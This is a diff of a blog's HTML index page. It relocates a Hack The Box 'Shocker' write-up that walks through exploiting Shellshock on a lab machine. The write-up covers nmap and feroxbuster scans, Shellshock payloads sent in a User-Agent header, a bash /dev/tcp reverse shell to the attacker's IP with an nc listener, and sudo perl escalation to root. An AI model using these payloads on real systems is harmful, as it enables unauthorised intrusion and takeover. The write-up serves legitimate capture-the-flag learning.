@@ -2051,208 +2051,6 @@
 
 
   
-    <article id="Shocker-Shocker" class="article article-type-Shocker" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/12/21/Shocker/" class="article-date">
-  	<time datetime="2024-12-21T12:32:07.095Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/Shocker/">
-        HTB_Shocker
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Shocker"><a href="#Shocker" class="headerlink" title="Shocker"></a>Shocker</h1><p>一、Shellshock的背景<br>Shellshock，又稱Bashdoor，是在Unix中廣泛使用的Bash shell中的一個安全漏洞，首次於2014年9月24日公開。許多互聯網守護進程，如網頁服務器，使用bash來處理某些命令，從而允許攻擊者在易受攻擊的Bash版本上執行任意代碼。這可使攻擊者在未授權的情況下訪問計算機系統。</p>
-<p>二、通過試驗和總結，Shellshock漏洞執行的條件<br>1、首先是Unix、linux等系統下的bash版本必須小於等於4.1版本；<br>2、可以猜出&#x2F;cgi-bin&#x2F;下目錄的文件；例如：&#x2F;cgi-bin&#x2F;test-cgi、&#x2F;cgi-bin&#x2F;test.sh、&#x2F;cgi-bin&#x2F;test.py、&#x2F;cgi-bin&#x2F;test.perl等等；<br>3、&#x2F;cgi-bin&#x2F;下的腳本文件通過系統環境變量調用bash的環境；</p>
-<p>nmap -sV -sC -A 10.129.108.18</p>
-<p><img src="/img/shocker_Untitled.png" alt="Untitled"></p>
-<ul>
-<li>80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))</li>
-<li>2222&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</li>
-</ul>
-<p>Now open the website </p>
-<p><img src="/img/shocker_Untitled_1.png" alt="Untitled"></p>
-<p>The page source is quite short</p>
-<p><img src="/img/shocker_Untitled_2.png" alt="Untitled"></p>
-<p>Here use feroxbuster scan the HTBIP</p>
-<ul>
-<li>feroxbuster -u <a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18</a> -x php,html</li>
-</ul>
-<p><img src="/img/shocker_Untitled_3.png" alt="Untitled"></p>
-<p>Typically, most webservers will handle a request to a directory without a trailing slash by sending a redirect to the same path but with the trailing slash</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">dirsearch</a> and <code>dirb</code> actually take the input wordlist and loop over each entry sending two requests, with and without the trailing slash</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18</a></li>
-<li><a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18/</a></li>
-</ul>
-<p>We all know that in the previous scan results, redirection will be performed. Here, selecting -n will not perform this action, and -f will add “&#x2F;“ to the URL of each request</p>
-<ul>
-<li>feroxbuster -u <a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18</a> -f -n</li>
-</ul>
-<p><img src="/img/shocker_Untitled_4.png" alt="Untitled"></p>
-<p>A CGI-bin is a folder used to house scripts that will interact with a Web browser to provide functionality for a Web page or website. Common Gateway Interface (CGI) is a resource for accommodating the use of scripts in Web design. As scripts are sent from a server to a Web browser, the CGI-bin is often referenced in a url.</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://10.129.108.18/cgi-bin/">http://10.129.108.18/cgi-bin/</a></li>
-</ul>
-<blockquote>
-<p>CGI scripts are perl scripts</p>
-</blockquote>
-<p>It can be known that cgi stores many scripts in it, here use -x to search for the file extension of the file below</p>
-<ul>
-<li>feroxbuster -u <a target="_blank" rel="noopener" href="http://10.129.108.18/cgi-bin/">http://10.129.108.18/cgi-bin/</a> -x sh,cgi,pl</li>
-</ul>
-<p><img src="/img/shocker_Untitled_5.png" alt="Untitled"></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://10.129.108.18/cgi-bin/user.sh">http://10.129.108.18/cgi-bin/user.sh</a></li>
-</ul>
-<p><img src="/img/shocker_Untitled_6.png" alt="Untitled"></p>
-<p>when i browse the content</p>
-<p><img src="/img/shocker_Untitled_7.png" alt="Untitled"></p>
-<p>Now open the burp and setting something</p>
-<ul>
-<li>Proxy &gt; options</li>
-</ul>
-<p><img src="/img/shocker_Untitled_8.png" alt="Untitled"></p>
-<p>Select to intercept the server’s request here, and further observe the contents of the. sh file</p>
-<p><img src="/img/shocker_Untitled_9.png" alt="Untitled"></p>
-<p><img src="/img/shocker_Untitled_10.png" alt="Untitled"></p>
-<p>Next step is execute shellshock </p>
-<ul>
-<li>locate nse | grep shellshock</li>
-</ul>
-<blockquote>
-<p>&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;http-shellshock.nse</p>
-</blockquote>
-<ul>
-<li>cat &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;http-shellshock.nse</li>
-</ul>
-<p><img src="/img/shocker_Untitled_11.png" alt="Untitled"></p>
-<ul>
-<li>POC ⇒ nmap -sV -p80 –script http-shellshock –script-args uri&#x3D;&#x2F;cgi-bin&#x2F;user.sh,cmd&#x3D;ls 10.129.108.18</li>
-</ul>
-<p>Set HTTP proxy and redirect in burp</p>
-<p><img src="/img/shocker_Untitled_12.png" alt="Untitled"></p>
-<p><img src="/img/shocker_Untitled_13.png" alt="Untitled"></p>
-<p><img src="/img/shocker_Untitled_14.png" alt="Untitled"></p>
-<p>Change the exploit according to the redirection IP and port set in the previous burp</p>
-<ul>
-<li>nmap -sV -p8081 –script http-shellshock –script-args uri&#x3D;&#x2F;cgi-bin&#x2F;user.sh,cmd&#x3D;ls 127.0.0.1</li>
-</ul>
-<p>At the same time of issuing this command, it is also necessary to enable burp and proxy intercept on</p>
-<blockquote>
-<p>In orde</p>
-</blockquote>
-<p>If successful, burp will show this screen</p>
-<p><img src="/img/shocker_Untitled_15.png" alt="Untitled"></p>
-<p>Then click forward all the way, until this screen appears</p>
-<p><img src="/img/shocker_Untitled_16.png" alt="Untitled"></p>
-<p>Check the HTTP History and find the screen record of the successful execution</p>
-<p><img src="/img/shocker_Untitled_17.png" alt="Untitled"></p>
-<p>send this record to repeate</p>
-<p><img src="/img/shocker_Untitled_18.png" alt="Untitled"></p>
-<p><strong>ShellShock test</strong></p>
-<ul>
-<li>() { :;}; echo; &#x2F;usr&#x2F;bin&#x2F;id</li>
-</ul>
-<p><img src="/img/shocker_Untitled_19.png" alt="Untitled"></p>
-<ul>
-<li>() { :;}; echo; &#x2F;bin&#x2F;ping -c 1 10.129.108.18</li>
-</ul>
-<p><img src="/img/shocker_Untitled_20.png" alt="Untitled"></p>
-<ul>
-<li>() { :;}; &#x2F;usr&#x2F;bin&#x2F;python3 -c ‘import os;os.system(“echo; &#x2F;bin&#x2F;ping -c 2 10.129.108.18”)’; &#x2F;bin&#x2F;ping -c 1 10.129.108.18</li>
-</ul>
-<p><img src="/img/shocker_Untitled_21.png" alt="Untitled"></p>
-<ul>
-<li>() { :;}; echo; &#x2F;usr&#x2F;bin&#x2F;python3 -c ‘import os; os.system(“&#x2F;bin&#x2F;ping -c 1 10.129.108.18”)’; &#x2F;usr&#x2F;bin&#x2F;id</li>
-</ul>
-<p><img src="/img/shocker_Untitled_22.png" alt="Untitled"></p>
-<p>Now change the proxy to intercept off and execute the namp instruction just now</p>
-<p><img src="/img/shocker_Untitled_23.png" alt="Untitled"></p>
-<p>After running the result, go back to burp to see the HTTP history, and you will see that () { :;}; ls is executed, but 500 Internal Server Error is returned</p>
-<p><img src="/img/shocker_Untitled_24.png" alt="Untitled"></p>
-<p>Logically speaking, it should not be a 500 response, referring to the previous expoit, I guess it is related to whether there is an echo;</p>
-<p>Sure enough, the response is indeed normal.</p>
-<p><img src="/img/shocker_Untitled_25.png" alt="Untitled"></p>
-<ul>
-<li>User-Agent: () { :;}; echo; &#x2F;bin&#x2F;ls</li>
-</ul>
-<p><img src="/img/shocker_Untitled_26.png" alt="Untitled"></p>
-<p>This is because there will be a blank line between the header and the text. If the line is missing, there will be 500 responses, so add echo;</p>
-<ul>
-<li>User-Agent: () { :;}; echo; &#x2F;bin&#x2F;bash -c whoami</li>
-</ul>
-<p><img src="/img/shocker_Untitled_27.png" alt="Untitled"></p>
-<p>now use reverse shell cheat sheet</p>
-<p><a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
-<blockquote>
-<p><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></p>
-</blockquote>
-<ul>
-<li>nc -nlvp 4444</li>
-<li>() { :;}; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.6&#x2F;4444 0&gt;&amp;1</li>
-</ul>
-<p><img src="/img/shocker_Untitled_28.png" alt="Untitled"></p>
-<p>Now you can get the flag of general users</p>
-<p><img src="/img/shocker_Untitled_29.png" alt="Untitled"></p>
-<ul>
-<li>sudo -l to see What the current user has permission to do</li>
-</ul>
-<p>User shelly may run the following commands on Shocker:</p>
-<blockquote>
-<p>(root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;perl</p>
-</blockquote>
-<p><img src="/img/shocker_Untitled_30.png" alt="Untitled"></p>
-<ul>
-<li><p>sudo perl -e ‘exec(“&#x2F;bin&#x2F;sh -i”)’</p>
-<p>  <img src="/img/shocker_Untitled_31.png" alt="Untitled"></p>
-</li>
-<li><p>find &#x2F; -name root.txt</p>
-</li>
-</ul>
-<p><img src="/img/shocker_Untitled_32.png" alt="Untitled"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
     <article id="post-TQC" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -2712,6 +2510,208 @@
 
 <p>則合併後的元組會是 <code>(5, 10, 3, 8, 2)</code>，排序後的列表將顯示為：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Combined list after sorting: [10, 8, 5, 3, 2]</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
+    <article id="Shocker-Shocker" class="article article-type-Shocker" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/12/21/Shocker/" class="article-date">
+  	<time datetime="2024-12-21T12:32:07.095Z" itemprop="datePublished">2024-12-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/12/21/Shocker/">
+        HTB_Shocker
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Shocker"><a href="#Shocker" class="headerlink" title="Shocker"></a>Shocker</h1><p>一、Shellshock的背景<br>Shellshock，又稱Bashdoor，是在Unix中廣泛使用的Bash shell中的一個安全漏洞，首次於2014年9月24日公開。許多互聯網守護進程，如網頁服務器，使用bash來處理某些命令，從而允許攻擊者在易受攻擊的Bash版本上執行任意代碼。這可使攻擊者在未授權的情況下訪問計算機系統。</p>
+<p>二、通過試驗和總結，Shellshock漏洞執行的條件<br>1、首先是Unix、linux等系統下的bash版本必須小於等於4.1版本；<br>2、可以猜出&#x2F;cgi-bin&#x2F;下目錄的文件；例如：&#x2F;cgi-bin&#x2F;test-cgi、&#x2F;cgi-bin&#x2F;test.sh、&#x2F;cgi-bin&#x2F;test.py、&#x2F;cgi-bin&#x2F;test.perl等等；<br>3、&#x2F;cgi-bin&#x2F;下的腳本文件通過系統環境變量調用bash的環境；</p>
+<p>nmap -sV -sC -A 10.129.108.18</p>
+<p><img src="/img/shocker_Untitled.png" alt="Untitled"></p>
+<ul>
+<li>80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))</li>
+<li>2222&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</li>
+</ul>
+<p>Now open the website </p>
+<p><img src="/img/shocker_Untitled_1.png" alt="Untitled"></p>
+<p>The page source is quite short</p>
+<p><img src="/img/shocker_Untitled_2.png" alt="Untitled"></p>
+<p>Here use feroxbuster scan the HTBIP</p>
+<ul>
+<li>feroxbuster -u <a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18</a> -x php,html</li>
+</ul>
+<p><img src="/img/shocker_Untitled_3.png" alt="Untitled"></p>
+<p>Typically, most webservers will handle a request to a directory without a trailing slash by sending a redirect to the same path but with the trailing slash</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">dirsearch</a> and <code>dirb</code> actually take the input wordlist and loop over each entry sending two requests, with and without the trailing slash</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18</a></li>
+<li><a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18/</a></li>
+</ul>
+<p>We all know that in the previous scan results, redirection will be performed. Here, selecting -n will not perform this action, and -f will add “&#x2F;“ to the URL of each request</p>
+<ul>
+<li>feroxbuster -u <a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18</a> -f -n</li>
+</ul>
+<p><img src="/img/shocker_Untitled_4.png" alt="Untitled"></p>
+<p>A CGI-bin is a folder used to house scripts that will interact with a Web browser to provide functionality for a Web page or website. Common Gateway Interface (CGI) is a resource for accommodating the use of scripts in Web design. As scripts are sent from a server to a Web browser, the CGI-bin is often referenced in a url.</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://10.129.108.18/cgi-bin/">http://10.129.108.18/cgi-bin/</a></li>
+</ul>
+<blockquote>
+<p>CGI scripts are perl scripts</p>
+</blockquote>
+<p>It can be known that cgi stores many scripts in it, here use -x to search for the file extension of the file below</p>
+<ul>
+<li>feroxbuster -u <a target="_blank" rel="noopener" href="http://10.129.108.18/cgi-bin/">http://10.129.108.18/cgi-bin/</a> -x sh,cgi,pl</li>
+</ul>
+<p><img src="/img/shocker_Untitled_5.png" alt="Untitled"></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://10.129.108.18/cgi-bin/user.sh">http://10.129.108.18/cgi-bin/user.sh</a></li>
+</ul>
+<p><img src="/img/shocker_Untitled_6.png" alt="Untitled"></p>
+<p>when i browse the content</p>
+<p><img src="/img/shocker_Untitled_7.png" alt="Untitled"></p>
+<p>Now open the burp and setting something</p>
+<ul>
+<li>Proxy &gt; options</li>
+</ul>
+<p><img src="/img/shocker_Untitled_8.png" alt="Untitled"></p>
+<p>Select to intercept the server’s request here, and further observe the contents of the. sh file</p>
+<p><img src="/img/shocker_Untitled_9.png" alt="Untitled"></p>
+<p><img src="/img/shocker_Untitled_10.png" alt="Untitled"></p>
+<p>Next step is execute shellshock </p>
+<ul>
+<li>locate nse | grep shellshock</li>
+</ul>
+<blockquote>
+<p>&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;http-shellshock.nse</p>
+</blockquote>
+<ul>
+<li>cat &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;http-shellshock.nse</li>
+</ul>
+<p><img src="/img/shocker_Untitled_11.png" alt="Untitled"></p>
+<ul>
+<li>POC ⇒ nmap -sV -p80 –script http-shellshock –script-args uri&#x3D;&#x2F;cgi-bin&#x2F;user.sh,cmd&#x3D;ls 10.129.108.18</li>
+</ul>
+<p>Set HTTP proxy and redirect in burp</p>
+<p><img src="/img/shocker_Untitled_12.png" alt="Untitled"></p>
+<p><img src="/img/shocker_Untitled_13.png" alt="Untitled"></p>
+<p><img src="/img/shocker_Untitled_14.png" alt="Untitled"></p>
+<p>Change the exploit according to the redirection IP and port set in the previous burp</p>
+<ul>
+<li>nmap -sV -p8081 –script http-shellshock –script-args uri&#x3D;&#x2F;cgi-bin&#x2F;user.sh,cmd&#x3D;ls 127.0.0.1</li>
+</ul>
+<p>At the same time of issuing this command, it is also necessary to enable burp and proxy intercept on</p>
+<blockquote>
+<p>In orde</p>
+</blockquote>
+<p>If successful, burp will show this screen</p>
+<p><img src="/img/shocker_Untitled_15.png" alt="Untitled"></p>
+<p>Then click forward all the way, until this screen appears</p>
+<p><img src="/img/shocker_Untitled_16.png" alt="Untitled"></p>
+<p>Check the HTTP History and find the screen record of the successful execution</p>
+<p><img src="/img/shocker_Untitled_17.png" alt="Untitled"></p>
+<p>send this record to repeate</p>
+<p><img src="/img/shocker_Untitled_18.png" alt="Untitled"></p>
+<p><strong>ShellShock test</strong></p>
+<ul>
+<li>() { :;}; echo; &#x2F;usr&#x2F;bin&#x2F;id</li>
+</ul>
+<p><img src="/img/shocker_Untitled_19.png" alt="Untitled"></p>
+<ul>
+<li>() { :;}; echo; &#x2F;bin&#x2F;ping -c 1 10.129.108.18</li>
+</ul>
+<p><img src="/img/shocker_Untitled_20.png" alt="Untitled"></p>
+<ul>
+<li>() { :;}; &#x2F;usr&#x2F;bin&#x2F;python3 -c ‘import os;os.system(“echo; &#x2F;bin&#x2F;ping -c 2 10.129.108.18”)’; &#x2F;bin&#x2F;ping -c 1 10.129.108.18</li>
+</ul>
+<p><img src="/img/shocker_Untitled_21.png" alt="Untitled"></p>
+<ul>
+<li>() { :;}; echo; &#x2F;usr&#x2F;bin&#x2F;python3 -c ‘import os; os.system(“&#x2F;bin&#x2F;ping -c 1 10.129.108.18”)’; &#x2F;usr&#x2F;bin&#x2F;id</li>
+</ul>
+<p><img src="/img/shocker_Untitled_22.png" alt="Untitled"></p>
+<p>Now change the proxy to intercept off and execute the namp instruction just now</p>
+<p><img src="/img/shocker_Untitled_23.png" alt="Untitled"></p>
+<p>After running the result, go back to burp to see the HTTP history, and you will see that () { :;}; ls is executed, but 500 Internal Server Error is returned</p>
+<p><img src="/img/shocker_Untitled_24.png" alt="Untitled"></p>
+<p>Logically speaking, it should not be a 500 response, referring to the previous expoit, I guess it is related to whether there is an echo;</p>
+<p>Sure enough, the response is indeed normal.</p>
+<p><img src="/img/shocker_Untitled_25.png" alt="Untitled"></p>
+<ul>
+<li>User-Agent: () { :;}; echo; &#x2F;bin&#x2F;ls</li>
+</ul>
+<p><img src="/img/shocker_Untitled_26.png" alt="Untitled"></p>
+<p>This is because there will be a blank line between the header and the text. If the line is missing, there will be 500 responses, so add echo;</p>
+<ul>
+<li>User-Agent: () { :;}; echo; &#x2F;bin&#x2F;bash -c whoami</li>
+</ul>
+<p><img src="/img/shocker_Untitled_27.png" alt="Untitled"></p>
+<p>now use reverse shell cheat sheet</p>
+<p><a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+<blockquote>
+<p><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></p>
+</blockquote>
+<ul>
+<li>nc -nlvp 4444</li>
+<li>() { :;}; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.6&#x2F;4444 0&gt;&amp;1</li>
+</ul>
+<p><img src="/img/shocker_Untitled_28.png" alt="Untitled"></p>
+<p>Now you can get the flag of general users</p>
+<p><img src="/img/shocker_Untitled_29.png" alt="Untitled"></p>
+<ul>
+<li>sudo -l to see What the current user has permission to do</li>
+</ul>
+<p>User shelly may run the following commands on Shocker:</p>
+<blockquote>
+<p>(root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;perl</p>
+</blockquote>
+<p><img src="/img/shocker_Untitled_30.png" alt="Untitled"></p>
+<ul>
+<li><p>sudo perl -e ‘exec(“&#x2F;bin&#x2F;sh -i”)’</p>
+<p>  <img src="/img/shocker_Untitled_31.png" alt="Untitled"></p>
+</li>
+<li><p>find &#x2F; -name root.txt</p>
+</li>
+</ul>
+<p><img src="/img/shocker_Untitled_32.png" alt="Untitled"></p>
 
       
     </div>
